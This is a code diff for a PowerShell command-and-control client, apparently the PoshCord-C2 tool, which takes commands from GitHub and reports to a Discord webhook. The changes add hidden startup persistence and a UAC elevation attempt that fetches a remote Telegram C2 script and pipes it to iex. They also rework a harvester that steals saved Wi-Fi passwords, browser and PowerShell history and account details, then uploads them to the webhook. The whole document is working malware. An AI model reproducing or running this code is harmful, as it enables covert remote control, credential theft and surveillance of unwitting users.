@@ -44,6 +44,7 @@ Save a hosted file contents as 'kill' to stop 'KeyCapture' or 'Exfiltrate' comma
 # $CCurl = "YOUR SECONDARY GITHUB FILE URL"  # (optional)
 # $hookurl = "YOUR WEBHOOK URL"
 
+$parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $response = Invoke-RestMethod -Uri $GHurl
 $previouscmd = $response
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":link: ``WAITING FOR COMMANDS..`` :link:"} | ConvertTo-Json
@@ -57,6 +58,7 @@ $msgsys = "``========================================================
 = Commands List -                                      =
 ========================================================
 = Close  : Close this Session                          =
+= Message : Send a message window to the User          =
 = Screenshot  : Sends a screenshot of the desktop      =
 = Keycapture   : Capture Keystrokes and send           =
 = Exfiltrate : Send various files.                     =
@@ -64,7 +66,11 @@ $msgsys = "``========================================================
 = TakePicture : Send a webcam picture.                 =
 = FolderTree : Save folder trees to file and send.     =
 = FakeUpdate : Spoof windows update screen.            =
+= AddPersistance : Add this script to startup.         =
+= RemovePersistance : Remove from startup              =
 = CustomCommand : Execute a github file as a script.   =
+= IsAdmin  : Check if the session is admin             =
+= AttemptElevate : Attempt to restart script as admin  =
 ========================================================
 = Examples and Info -                                  =
 ========================================================
@@ -90,6 +96,12 @@ rm -Path $FilePath -Force
 Write-Output "Done."
 }
 
+Function Message([string]$Message){
+msg.exe * $Message
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Message Sent to User..`` :arrows_counterclockwise:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
 Function FakeUpdate {
 $tobat = @'
 Set WshShell = WScript.CreateObject("WScript.Shell")
@@ -105,6 +117,36 @@ Start-Process -FilePath $pth
 sleep 3
 Remove-Item -Path $pth -Force
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Fake-Update Sent..`` :arrows_counterclockwise:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function AddPersistance{
+$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
+$scriptContent | Out-File -FilePath $newScriptPath -force
+sleep 1
+if ($newScriptPath.Length -lt 100){
+    "`$hookurl = `"$hookurl`"" | Out-File -FilePath $newScriptPath -Force
+    "`$ghurl = `"$ghurl`"" | Out-File -FilePath $newScriptPath -Force -Append
+    "`$ccurl = `"$ccurl`"" | Out-File -FilePath $newScriptPath -Force -Append
+    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
+    sleep 1
+    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+    }
+$tobat = @'
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\PowerShell\copy.ps1""", 0, True
+'@
+$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
+$tobat | Out-File -FilePath $pth -Force
+rm -path "$env:TEMP\temp.ps1" -Force
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``Persistance Added!`` :white_check_mark:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+}
+
+Function RemovePersistance{
+rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
+rm -Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Persistance Removed!`` :octagonal_sign:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 }
 
@@ -162,88 +204,69 @@ Remove-Item -Path $zipFilePath -Force
 }
 
 Function SystemInfo{
-
-$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full")
-$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
+$userInfo = Get-WmiObject -Class Win32_UserAccount ;$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
+$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches ;$email = ("$email").Trim()
+$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
+$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
 $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
-$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1}
-$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
-$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
-$computerSystem = Get-CimInstance CIM_ComputerSystem
-$computerBIOS = Get-CimInstance CIM_BIOSElement
-$computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
-$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
-$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List
-$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
-$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table
-$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution
-$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }
+$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
+$processorInfo = Get-WmiObject -Class Win32_Processor
+$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
+$userInfo = Get-WmiObject -Class Win32_UserAccount
+$videocardinfo = Get-WmiObject Win32_VideoController
+$Hddinfo = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } ;$Hddinfo=($Hddinfo| Out-String) ;$Hddinfo = ("$Hddinfo").TrimEnd("")
+$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
+$users = "$($userInfo.Name)"
+$userString = "`nFull Name : $($userInfo.FullName)"
+$OSString = "$($systemInfo.Caption) $($systemInfo.OSArchitecture)"
+$systemString = "Processor : $($processorInfo.Name)"
+$systemString += "`nMemory : $RamInfo"
+$systemString += "`nGpu : $($videocardinfo.Name)"
+$systemString += "`nStorage : $Hddinfo"
 $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
 $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
 $service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
 $software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
 $drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
-$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
-$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
+$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
+$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
+$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
+$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
 $pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw
-
-Add-Type -AssemblyName System.Device;$Geolocate = New-Object System.Device.Location.GeoCoordinateWatcher;$Geolocate.Start()
-while (($Geolocate.Status -ne 'Ready') -and ($Geolocate.Permission -ne 'Denied')) {Start-Sleep -Milliseconds 100}  
-$Geolocate.Position.Location | Select Latitude,Longitude
-
+$outpath = "$env:temp\systeminfo.txt"
 $outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
 if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
 $pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
 
-$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
-$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
-$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
+$infomessage = "``========================================================
 
-$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
-$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
-$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
+Current User    : $env:USERNAME
+Email Address   : $email
+Language        : $systemLanguage
+Keyboard Layout : $keyboardLayoutID
+Other Accounts  : $users
+Public IP       : $computerPubIP
+Current OS      : $OSString
+Hardware Info
+--------------------------------------------------------
+$systemString``"
 
-$outpath = "$env:temp\systeminfo.txt"
-"USER INFO `n =========================================================================" | Out-File -FilePath $outpath -Encoding ASCII
-"Full Name          : $fullName" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Email Address      : $email" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Location           : $Geolocate" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Computer Name      : $env:COMPUTERNAME" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Language           : $systemLanguage" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Keyboard Layout    : $keyboardLayoutID" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"NETWORK INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Public IP          : $computerPubIP" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Saved Networks     : $outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Local IP           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($computerIP| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Adapters           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($network| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"HARDWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"computer           : $computerSystem" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"BIOS Info          : $computerBIOS" | Out-File -FilePath $outpath -Encoding ASCII -Append
-"RAM Info           : $computerRamCapacity" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($computerRam| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"OS Info            `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($computerOs| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"CPU Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($computerCpu| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Graphics Info      `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($videocard| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"HDD Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
-($Hdds| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"USB Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"--------------------- SYSTEM INFORMATION for $env:COMPUTERNAME -----------------------`n" | Out-File -FilePath $outpath -Encoding ASCII
+"General Info `n $infomessage" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Network Info `n -----------------------------------------------------------------------`n$outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"USB Info  `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($COMDevices| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($software| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Processes          `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Processes  `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($process| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Services           `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Services `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($service| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"Drivers            : $drivers" | Out-File -FilePath $outpath -Encoding ASCII -Append
+"Drivers `n -----------------------------------------------------------------------`n$drivers" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
@@ -251,15 +274,47 @@ $outpath = "$env:temp\systeminfo.txt"
 ($Value2| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding ASCII -Append
 ($pshistory| Out-String) | Out-File -FilePath $outpath -Encoding ASCII -Append
-"`n" | Out-File -FilePath $outpath -Encoding ASCII -Append
 
-$Pathsys = "$env:temp\systeminfo.txt"
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``System Information.`` :computer:"} | ConvertTo-Json
-Start-Sleep 1
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
-curl.exe -F file1=@"$Pathsys" $hookurl
-Remove-Item -Path $Pathsys -force
 
+Sleep 1
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$infomessage"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+
+curl.exe -F file1=@"$outpath" $hookurl
+Sleep 1
+Remove-Item -Path $outpath -force
+}
+
+Function IsAdmin{
+If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    }
+    else{
+    $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":white_check_mark: ``You are Admin!`` :white_check_mark:"} | ConvertTo-Json
+    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+    }
+}
+
+Function AttemptElevate{
+$tobat = @"
+Set WshShell = WScript.CreateObject(`"WScript.Shell`")
+WScript.Sleep 200
+If Not WScript.Arguments.Named.Exists(`"elevate`") Then
+  CreateObject(`"Shell.Application`").ShellExecute WScript.FullName _
+    , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
+  WScript.Quit
+End If
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$hookurl='$hookurl';`$ghurl='$ghurl';`$ccurl='$ccurl'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex`", 0, True
+"@
+$pth = "C:\Windows\Tasks\service.vbs"
+$tobat | Out-File -FilePath $pth -Force
+& $pth
+Sleep 7
+rm -Path $pth
+Write-Output "Done."
 }
 
 Function TakePicture {
@@ -416,9 +471,25 @@ while($true){
             $previouscmd = $response
             FolderTree
         }
+        if ($response -match "addpersistance") {
+            $previouscmd = $response
+            AddPersistance
+        }
+        if ($response -match "removepersistance") {
+            $previouscmd = $response
+            RemovePersistance
+        }
         if ($response -match "customcommand") {
             $previouscmd = $response
             $customcommand = Invoke-RestMethod -Uri $CCurl | iex
+        }
+        if ($response -match "isadmmin") {
+            $previouscmd = $response
+            IsAdmin
+        }
+        if ($response -match "attemptelevate") {
+            $previouscmd = $response
+            AttemptElevate
         }
         elseif (!($response -match "$previouscmd")) {
             $Result=ie`x($response) -ErrorAction Stop
